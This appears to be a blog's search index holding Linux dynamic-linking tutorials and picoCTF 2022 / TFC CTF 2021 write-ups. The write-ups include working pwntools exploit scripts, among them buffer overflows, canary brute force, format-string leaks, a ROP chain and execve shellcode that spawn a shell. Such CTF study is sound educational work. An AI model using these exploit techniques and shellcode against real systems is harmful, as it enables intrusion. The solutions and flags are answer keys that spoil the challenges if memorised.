[{"categories":["Linux","ELF"],"content":"Linux libraries part 1 In this part 1 about Linux libraries, we will talk about dynamically linked binaries. How symbols are dynamically resolved. The role of PLT \u0026 GOT and the linker. ","date":"2022-09-28","objectID":"/linux-libraries-1/:0:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Index","uri":"/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x0 Intro The statically linked binary includes all the libraries it needs to work at compile time, but this is not the case for the dynamically linked binary. Let’s take the image of the part0 again. For the statically linked, we have a direct call on the printf function. Let’s disassemble and look inside. As you can see, we obviously have the printf code. Thinking What about dynamically linked binary? // ami.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(){ printf(\"I'm _R4v3n\"); exit(0); return 0; } gcc -m32 -o ami ami.c First we can see that instead of printf we have printf@plt. Let’s disassemble it anyway and see what’s there. We see that we don’t have the printf code directly but a jump to a location followed by a push and a jump at the end. Thinking So how is the printf solved? ","date":"2022-09-28","objectID":"/linux-libraries-1/:1:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Index","uri":"/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x1 The dynamic linker When starting a dynamically linked ELF binary, the kernel loads the ELF image of the binary into the virtual memory of the user space. On loading, an .interp section is detected by the kernel. This section contains the path of a program interpreter. This is the dynamic linker, /lib64/ld-linux-x86-64.so.2 in my case on the picture above. Let’s display the content of the .interp section and see what it contains. Obviously the .interp section contains the path of the dynamic link editor. The kernel will start the dynamic linker, which initializes and loads the shared objects that the binary needs. Let’s display the list of shared objects that the binary needs with the ldd command. Once the linker finishes its work, the original program starts running. At runtime, the linker will be called again for symbol resolution. In fact, not all symbols are resolved at runtime. As long as a symbol is not actually used, it is not resolved: this process is called Lazy binding. When a function is called for the first time, the linker looks for the address of this function in the libc and provides a mechanism for calling the function: this is called relocation. Thinking How does the symbol resolution process work? ","date":"2022-09-28","objectID":"/linux-libraries-1/:2:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Index","uri":"/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x2 PLT \u0026 GOT | relocation Several sections are involved in this resolution process. .plt : Procedure Linkage Table. It is used to call external procedures/functions whose address is not known at the time of binding and must be resolved by the dynamic linker at runtime. It contains a piece of code that looks for addresses in the .got.plt section and jumps to the correct address if the address is already resolved, or triggers the code in the linker to look for the address. .got : Global Offset Table This is the actual offset table filled in by the linker for external symbols. .got.plt : It is also a part of the .got. It contains the target addresses (after they have been searched) or a return address in the .plt to trigger the search. Let’s take a closer look at how the symbol is resolved and what the role of these sections is. Let’s take this code // ami.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(){ printf(\"I'm _R4v3n\"); return 0; } Let’s compile and debug with GDB to see better. gcc -m32 -o ami ami.c In my case I will use the plugin GEF. The main: Then a call on printf@plt The address of our printf@plt call points to the .plt section. In other words, the address 0x1040 of printf@plt is in the range 0x00001020 - 0x00001060 which is the range of the .plt section. The content of the .plt section: The .plt section is composed of sub-sections that can be called entry. Here we have 4 entry: entry 0, 1, 2, 3 each composed of three instructions. Entry 0 is a bit special, the other entry follow the same pattern: we have a jump followed by a push and a jump. Entry 2 for printf Entry 3 for exit At the first instruction of each entry, we have a jump to a pointer. The processor will dereference the pointer and jump to the address obtained. If we take a look, we can see that these addresses obtained by dereferencing are close, including that of the 0 entry. For that, let’s put a breakpoint at the call of printf@plt and run the program to see better. Obviously these addresses are near each other (0x56558ffc, 0x56559000, 0x56559004, 0x56559008) and all point to the .got.plt section. We, our call from printf@plt jumps directly to the address 0x56556040 in the .plt section, let’s follow that. The first instruction is a jump in the .got.plt at address 0x56556046 obtained by dereferencing the pointer DWORD PTR [ebx+0x10]. Let’s display what is at this address obtained. Keep $ebx+0x10 —-\u003e 0x56559004 (got.plt) –\u003e 0x56556046 (plt) We can see that this is the address of the next instruction in the plt : 0x56556046 \u003cprintf@plt+6\u003e: push 0x8 In other words, this brings us back to the next instruction. Normally we should get the address of printf at this address 0x56559004 in the .got.plt but we have the address of the next instruction. Tip You may have wondered why. If you haven’t asked yourself that question then it doesn’t matter. This is because we have never called printf before and we need to trigger the first search. I’m talking about looking up the address of printf in the libc, of course. Once at the next instruction, offset 0x8 is pushed onto the stack. After that, we have a jump to the address 0x56556020, which brings us to the entry 0 of .plt At entry 0, we have four instructions. The first one stacks the value 0x56558ff8, which is in the .got.plt and points to 0xf7ffd9e0 in the .bss linker section. Keep $ebx+0x4 —-\u003e 0x56558ff8 (got.plt) –\u003e 0xf7ffd9e0 (.bss in /lib/ld-linux.so.2) On the second instruction we have a jump to the address 0xf7fdc1b0, which is in the .text of the linker. Keep $ebx+0x8 —-\u003e 0x56558ffc (got.plt) –\u003e 0xf7fdc1b0 (.text in /lib/ld-linux.so.2) Since this is the first time printf is called, the linker is called to look up the address of printf and update the GOT. Let’s have a look at this .text section of the link from the obtained address. This is not really the address resolution function but simply calls the real resolution function. Thinking How does she know that this is the resolution of printf but not scanf?","date":"2022-09-28","objectID":"/linux-libraries-1/:3:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Index","uri":"/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"0x3 Exploitation GOT Overwrite Ret2libc References IBM : Anatomy of Linux dynamic libraries Sections of an ELF File Lazy Loading of Dynamic Dependencies ","date":"2022-09-28","objectID":"/linux-libraries-1/:4:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries","PLT","GOT","LD","Lazy binding","pwn"],"title":"Index","uri":"/linux-libraries-1/"},{"categories":["Linux","ELF"],"content":"Linux libraries part 0 In this series of articles, I will explain what I understand about Linux libraries. In this series of articles, I will explain what I understand about Linux libraries. At the beginning when I started Buffer Overflow I felt stuck because I was missing some basic notions like how Linux libraries work, PLT \u0026 GOT, dynamic linker, shared objects, etc … So I tried to understand and today I thought I would write an article about it and come back later if necessary and also if it could help someone. ","date":"2022-06-07","objectID":"/linux-libraries/:0:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/linux-libraries/"},{"categories":["Linux","ELF"],"content":"What is libraries ? When you code in C, you use functions like printf to print or scanf to type, etc. These functions, you didn’t code them yourself but you use them. Where are these functions? These functions are in a library on your system. This library is a set of pre-coded functions that you don’t need to recode each time but use them directly. You will save a lot of time. Here I took the example of function but a library does not contain only function, there are also variables, etc… In short, libraries are an easy way to reuse code. They allow similar functionality to be grouped together in a single unit. These units allow developers to write their code from modules: this is called modular programming. Under Linux, there are two types of libraries, the static libraries and the dynamic libraries (shared libraries). ","date":"2022-06-07","objectID":"/linux-libraries/:1:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/linux-libraries/"},{"categories":["Linux","ELF"],"content":"Static libraries At this level the editing of links is done in a static way. That is, at compile time all the libraries that the executable needs to run are integrated inside. ","date":"2022-06-07","objectID":"/linux-libraries/:2:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/linux-libraries/"},{"categories":["Linux","ELF"],"content":"advantage: All symbols are resolved at runtime. The function calls are fast. Example: ","date":"2022-06-07","objectID":"/linux-libraries/:2:1","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/linux-libraries/"},{"categories":["Linux","ELF"],"content":"Disadvantages The libraries are duplicated in each executable. So we use a lot of space on the machine. If you update the printf function in the library, for example, you have to recompile all the executables. Example: test.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main(){ printf(\"I'm _R4v3n\"); return 0; } gcc -o test test.c gcc -static -o test_static test.c -static to compile in static mode. When it is static the size is high. Here we have used only the printf function. As we use more functions in our code, the size of the executable will increase. To check if the executable is statically linked. ","date":"2022-06-07","objectID":"/linux-libraries/:2:2","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/linux-libraries/"},{"categories":["Linux","ELF"],"content":"Dynamic libraries In the next part we will see the dynamic libraries. Prerequisites: Basic assembly, GDB References IBM : Anatomy of Linux dynamic libraries ","date":"2022-06-07","objectID":"/linux-libraries/:3:0","tags":["Linux","ELF","Dynamic Linker","Shared libraries"],"title":"Linux libraries part 0","uri":"/linux-libraries/"},{"categories":[],"content":" 2022 Reverse engineering training Lead. Organizer : #BjWhiteHat Reverse engineering Today I led a training on reverse engineering organized by #BjWhiteHat. Next time, we will work on Buffer overflow, Malware Analysis, Binary patch, etc.. @auberiic @michpice04 @LSemassa @Anssi_Benin #infosec #reverse #bj pic.twitter.com/Ru59M9nn1q — _R4v3n AM1 (@w31rdr4v3n) May 28, 2022 First place(1st) at picoCTF Africa 2022 with my team Ph0n1X. Organizer: picoCTF \u0026 Cylab 2020 Third place(3rd) at HackerLab2020 with my team Und3r_Th3_R00T. Organizer: ANSSI Bénin ","date":"2022-03-31","objectID":"/events/:0:0","tags":[],"title":"Events","uri":"/events/"},{"categories":[],"content":" Analyst Developer SOC Analyst Security researcher Linux Kernel Pwn Exploit Dev CTF Player [Ability: Pwn, Reverse] ","date":"2022-03-30","objectID":"/about/:0:0","tags":[],"title":"About me","uri":"/about/"},{"categories":["CTF"],"content":"This article presents answers to the picoCTF 2022 challenges.","date":"2022-03-30","objectID":"/picoctf2022-writeup/","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"picoCTF 2022 This article presents answers to the picoCTF 2022 challenges. ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:0:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"basic-file-exploit [Pwn] The program menu: create or read entries in the database. $ nc saturn.picoctf.net 49700 Hi, welcome to my echo chamber! Type '1' to enter a phrase into our database Type '2' to echo a phrase in our database Type '3' to exit the program In the source code, with the input number 0 we can display the flag. if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); } Result: ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:1:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 0 [Pwn] ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:2:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 1 [Pwn] $ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=96273c06a17ba29a34bdefa9be1a15436d5bad81, for GNU/Linux 3.2.0, not stripped The binary is 32 bits. void vuln(){ char buf[BUFSIZE]; gets(buf); printf(\"Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n\", get_return_address()); } The size of the data entered via gets(buf) is not controlled, so you can enter anything. This can cause a buffer overflow. It is enough to control the return address to redirect the flow of execution to the win() function to display the flag. In gdb, I placed a breakpoint on the ret of vuln() For a test, I send this payload: “A”*(32+4+4+4) + “BBBB” The EIP is well reached. It remains to redirect the execution flow to the win() function at address 0x080491f6. from pwn import * #sh = process(\"./vuln\") sh = remote(\"saturn.picoctf.net\",54376) print(sh.recv().decode()) sh.sendline(b\"A\"*(32+4+4+4)+p32(0x080491f6)) sh.interactive() Result: ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:3:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"RPS [Pwn] if (wins \u003e= 5) { puts(\"Congrats, here's the flag!\"); puts(flag); } If we win 5 times, we have the flag. char* hands[3] = {\"rock\", \"paper\", \"scissors\"}; char* loses[3] = {\"paper\", \"scissors\", \"rock\"}; .... int computer_turn = rand() % 3; printf(\"You played: %s\\n\", player_turn); printf(\"The computer played: %s\\n\", hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) { puts(\"You win! Play again?\"); return true; } else { puts(\"Seems like you didn't win this time. Play again?\"); return false; } To win, the computer choice must exist in the player choice. So I used paperscissorsrock to win all 5 times. ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:4:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"x-sixty-what [Pwn] Overflow x64 code from pwn import * sh = process(\"./vuln\") print(sh.recv().decode()) sh.sendline(b\"A\"*(64+8) + p64(0x00401236)) # flag() adresse: 0x00401236 sh.interactive() It worked locally but not on the remote server. This is a Movaps stack alignment issue. Movaps stack alignment If you’re segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system()Read more… The solution is to call the ret of the other address one more time before calling the flag() function when designing the overflow stack, so that the rsp address can be reduced by 8. I used the return address from init. To find it: objdump vuln -M intel –disassemble=_init from pwn import * sh = remote(\"saturn.picoctf.net\",58049) print(sh.recv().decode()) sh.sendline(b\"A\"*(64+8) + p64(0x0040101a) + p64(0x00401236)) sh.interactive() ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:5:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 2 [Pwn] Control the return address and arguments 32 bits function call: fun_addr + 4 bytes + arg0 + arg1 + arg2 + …. + argn from pwn import * sh = remote(\"saturn.picoctf.net\",60889) print(sh.recv().decode()) sh.sendline(b\"A\"*(100+4+4+4) + p32(0x08049296) + b\"P\"*4 + p32(0xCAFEF00D) + p32(0xF00DF00D)) sh.interactive() ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:6:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"buffer overflow 3 [Pwn] Brute force canary: from pwn import * canary = b'' while len(canary) \u003c 4: for i in range(256): sh = remote(\"saturn.picoctf.net\",54629) sh.sendlineafter('\u003e ', '{}'.format(64 + len(canary) + 1)) a = '{}'.format(chr(i)) sh.sendlineafter('\u003e ', b'A' * 64 + canary + a.encode()) log.info('Partial canary: {}'.format(canary)) if b'*** Stack Smashing Detected' not in sh.recvline(): canary += chr(i).encode() log.info('Partial canary: {}'.format(canary)) break sh.close() log.info('Found canary: {}'.format(canary)) Exploit: from pwn import * canary = b\"BiRd\" while True: p = remote(\"saturn.picoctf.net\",60398) p.sendlineafter(\"Buffer?\\n\u003e \", str(0x100)) # Size of payload payload = b\"A\"*64 + canary + b\"A\"*16 + p32(0x08049336) p.sendlineafter(\"Input\u003e \", payload) out = p.recvall() if b\"pico\" in out: print(out.decode()) break p.close() ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:7:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"flag leak [Pwn] Format Strings from pwn import * for i in range(100): sh = remote(\"saturn.picoctf.net\",50120) print(sh.recv().decode()) payload = '%{}$s'.format(i) sh.sendline(payload.encode()) data = sh.recvall() print(data) sh.close() Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2} ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:8:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"ropfu [Pwn] What’s ROP? Static ROP I created my shellcode from the ROP gadgets. ROPgadget --binary ./vuln --rop --badbytes \"0a\" Exploit : from pwn import * import sys import subprocess sh = remote(\"saturn.picoctf.net\",55455) # ROPgadget --binary ./vuln --rop --badbytes \"0a\" from struct import pack p = b'a'*(16+4+4+4) p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5060) # @ .data p += pack('\u003cI', 0x41414141) # padding p += pack('\u003cI', 0x080b074a) # pop eax ; ret p += b'/bin' p += pack('\u003cI', 0x08059102) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5064) # @ .data + 4 p += pack('\u003cI', 0x41414141) # padding p += pack('\u003cI', 0x080b074a) # pop eax ; ret p += b'//sh' p += pack('\u003cI', 0x08059102) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5068) # @ .data + 8 p += pack('\u003cI', 0x41414141) # padding p += pack('\u003cI', 0x0804fb90) # xor eax, eax ; ret p += pack('\u003cI', 0x08059102) # mov dword ptr [edx], eax ; ret p += pack('\u003cI', 0x08049022) # pop ebx ; ret p += pack('\u003cI', 0x080e5060) # @ .data p += pack('\u003cI', 0x08049e39) # pop ecx ; ret p += pack('\u003cI', 0x080e5068) # @ .data + 8 p += pack('\u003cI', 0x080583c9) # pop edx ; pop ebx ; ret p += pack('\u003cI', 0x080e5068) # @ .data + 8 p += pack('\u003cI', 0x080e5060) # padding without overwrite ebx p += pack('\u003cI', 0x0804fb90) # xor eax, eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0808055e) # inc eax ; ret p += pack('\u003cI', 0x0804a3d2) # int 0x80 print(sh.recv().decode()) sh.sendline(p) sh.interactive() ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:9:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"wine [Pwn] I solved this challenge directly without working on the binary (gdb, etc..) from pwn import * sh = remote(\"saturn.picoctf.net\",56673) print(sh.recv().decode()) payload = b\"A\"*(128+4+4+4) + p32(0x00401530) sh.sendline(payload) sh.interactive() ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:10:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"function overwrite [Pwn] Note When I read the code, I realized that check points to hard_checker. To exploit it, you would have to point check to easy_checker. Then, you have to fill story with values whose sum is equal to 1337 story could be abcdefghijklk, the sum is indeed equal to 1337. To point check to easy_checker, I thought of Write-what-where Condition vuln() fonction ...... if (num1 \u003c 10) { fun[num1] += num2; } ..... We will use the integer array fun to access check in order to point it to easy_checker. We will use the index num1 of the array fun to access check and num2 to modify its value. First, we determine the offset between fun and check for num1. 0x0804c040 check 0x0804c080 fun 0x0804c080 - 0x0804c040 = 64 fun - check = 64 fun - 64 = check To access check you have to subtract 64 from the address of fun. As num1 is of type int, num1 = -64/sizeof(int) Second, we point check to easy_checker. check points to hard_checker To point it to easy_checker, we must first determine the offset between hard_checker and easy_checker. 0x8049436 - 0x80492fc = 314 hard_checker - easy_checker = 314 hard_checker - 314 = easy_checker So, to point check to easy_checker we have to subtract 314 from the address of hard_checker. As check contains the address of hard_checker, we decrease its value by 314. num2 = -314 Exploit: from pwn import * sh = remote(\"saturn.picoctf.net\",53163) print(sh.recv().decode()) sh.sendline(b\"abcdefghijklk\") print(sh.recv().decode()) sh.sendline(b\"-16 -314\") print(sh.recv().decode()) Result: ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:11:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"stack cache [Pwn] #define BUFSIZE 16 #define FLAGSIZE 64 void win() { char buf[FLAGSIZE]; char filler[BUFSIZE]; FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"%s %s\", \"Please create 'flag.txt' in this directory with your\", \"own debugging flag.\\n\"); exit(0); } fgets(buf,FLAGSIZE,f); // size bound read } The win() function does not display the flag but reads it from the buf array. We need to find a way to disclose the flag contained in array buf. #define BUFSIZE 16 void UnderConstruction() { // this function is under construction char consideration[BUFSIZE]; char *demographic, *location, *identification, *session, *votes, *dependents; char *p,*q, *r; // *p = \"Enter names\"; // *q = \"Name 1\"; // *r = \"Name 2\"; unsigned long *age; printf(\"User information : %p %p %p %p %p %p\\n\",demographic, location, identification, session, votes, dependents); printf(\"Names of user: %p %p %p\\n\", p,q,r); printf(\"Age of user: %p\\n\",age); fflush(stdout); } The UnderConstruction() function will do the trick. Now just redirect the execution flow to the win() function and then to the UnderConstruction() function. from pwn import * sh = remote('saturn.picoctf.net', 56141) eip = p32(0x08049da0) # win() esp = p32(0x08049e20) # UnderConstruction() print(sh.recvuntil(b\"Give me a string that gets you the flag\").decode()) sh.sendline(b\"A\"*(10 +4) + rip + esp) sh.interactive() I wrote a python script for that. from binascii import unhexlify cache = ['080c9a04', '0804007d', '61333337', '31646239', '5f597230', '6d334d5f', '50755f4e', '34656c43', '7b465443', '6f636970'] flag = \"\" for pin in cache: try: flag += unhexlify(pin).decode() except:pass print(flag[::-1]) ","date":"2022-03-30","objectID":"/picoctf2022-writeup/:12:0","tags":["picoCTF","pwn","reverse","crypto","forensic"],"title":"picoCTF2022 Writeup","uri":"/picoctf2022-writeup/"},{"categories":["CTF"],"content":"This article provides answer keys to the TFC CTF 2021 challenges.","date":"2021-12-23","objectID":"/tfcctf2021-writeup/","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"TFC CTF 2021 This article provides answer keys to the TFC CTF 2021 challenges. ","date":"2021-12-23","objectID":"/tfcctf2021-writeup/:0:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Jumpy [Pwn] Attached file:here Output of checksec $ checksec jumpy The NX is disabled so we can run on the stack. Jumpy C code obtained by reverse engineering with ghidra. In the binary, there is no system function and no function to read the flag. As the stack is executable, we can push shellcode on it and execute it. First, we need to control the RIP. I have placed a breakpoint on the ret of the main function. With 0x38 we can reach the RIP. For a test, I send this load: “A “*0x38 + “BBBB” The RIP is well reached. We can now execute our shellcode on the stack. payload = “A “*0x38 + RSP_addr + shellcode We will push the shellcode on the RSP and call the RSP address in the RIP to be able to execute the shellcode. We don’t have the address of the RSP but by doing a little research in the binary we have an instruction that makes a jump on the RSP, that will do the trick. With the address of this instruction in the RIP, we can make a jump into the RSP and execute what is inside. payload = “A”*0x38 + p64(0x00401142) + shellcode Exploit: from pwn import * sh = process(\"./jumpy\") #sh = remote(\"34.65.228.239\",1337) shellcode = b\"\\x31\\xf6\\x48\\xbf\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdf\\xf7\\xe6\\x04\\x3b\\x57\\x54\\x5f\\x0f\\x05\" payload = b\"A\"*0x38 + p64(0x00401142) + shellcode print(sh.recv().decode()) sh.sendline(payload) sh.interactive() Result: ","date":"2021-12-23","objectID":"/tfcctf2021-writeup/:1:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Secret [Pwn] Attached file:here from pwn import * sh = process(\"./secret\") print(sh.recv().decode()) sh.sendline(p32(0xaabbccdd)*2) print(sh.recvall().decode()) Result: ","date":"2021-12-23","objectID":"/tfcctf2021-writeup/:2:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Santa [Pwn] Attached file:here Output of checksec $ checksec santa The NX is enabled, so we can’t run anything on the stack, but off the stack. In this case, we will target the RSP. Let’s run the binary. Santa’s C code obtained by reverse engineering with ghidra. I found a flag function. Here, we will have to cause a buffer overflow and execute the code of the flag function but not on the stack. To reach the RSP: “A” * 0x38 + “BBBBBBBB” We can see that the RSP is reached. We can now write our exploit to execute the flag function. Address of flag function : 0x00401152 You can find it in gdb with the command : info functions Exploit: from pwn import * #sh = remote(\"server.challenge.ctf.thefewchosen.com\",1340) sh = process(\"./santa\") payload = b\"A\"*(0x38) + p64(0x00401152) print(sh.recv().decode()) sh.sendline(payload) print(sh.recv().decode()) Result: But there is a problem. When I used it on the remote server, it did not work. [*] Got EOF while reading in interactive Movaps stack alignment If you’re segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system()Read more… The solution is to call the ret of the other address one more time before calling the flag() function when designing the overflow stack, so that the rsp address can be reduced by 8. I used the return address from init. To find it: objdump santa -M intel –disassemble=_init New exploit: from pwn import * sh = remote(\"server.challenge.ctf.thefewchosen.com\",1340) #sh = process(\"./santa\") payload = b\"A\"*(0x38) + p64(0x00401016) + p64(0x00401152) print(sh.recv().decode()) sh.sendline(payload) print(sh.interactive()) ","date":"2021-12-23","objectID":"/tfcctf2021-writeup/:3:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Weid friend [Misc] Attached file:here I use: strong-qr-decoder c = open(\"weird_friend.txt\").read().strip() flag,out = ('','') for i in c: flag += i if len(flag) == 29: out += flag+\"\\n\" flag=\"\" open(\"qr.txt\",\"w\").write(out) Result: ","date":"2021-12-23","objectID":"/tfcctf2021-writeup/:4:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/tfcctf2021-writeup/"},{"categories":["CTF"],"content":"Am i doing it right? [Crypto] Attached file:here Premierly, I wanted to use RSACTFTOOL to find D but it did not work. So I recover the N and the E with RSACTFTOOL. I used some tools to retrieve the p, q and d but it does not work until i tried RSa-Cipher on Dcode And bingo, I have the p, q and d. So I wrote a Python script to decrypted the chall.enc file. from Crypto.Util.number import long_to_bytes,bytes_to_long c = open(\"chall.enc\",\"rb\").read() c = bytes_to_long(c) n = 17729028558979019485846420034614601781855286885772116033115998289130663218793249135103097941406615594783564487056148202535602218241261076180277862184340050681277512936764254998557657989633659561175844653871375735119626199870178796372816549333367076487655787617921785826120525919291798195591267544750350222858119219959311035913906885739352404726672836723117136379411134589884489391116922923390687958161705756705708668649262568471831705504852664779788943978721769038284989250803324876493071615384204553854811020877754034576798208169454695001947778015807032019651748938505463608871771494765303144219873993106068807291321 e = 65537 d = 3500250248327349941672136790330322298173940781772211260089535710561387481696840724462501857940708289682233561164220235784490548878094466708830359320737536288891004163888989356033042963942046798938832323366063912548832619743354798758989171488234685790832327326369684099122228433857463369589017055427083655546629869448560863558252541573729181294198925126252806108158471450212498376272391643662951937867203907881541852521739527440641096867158947718038717211827677824862115138300242300421747601306316869658769565879739394458142873158790249493313154357342610957929927393333582078957693189916431285660748179207993771566093 m = pow(c,d,n) print(long_to_bytes(m)) Result: ","date":"2021-12-23","objectID":"/tfcctf2021-writeup/:5:0","tags":["ctf","crypto","misc","pwn"],"title":"TFC CTF 2021 Writeup","uri":"/tfcctf2021-writeup/"}]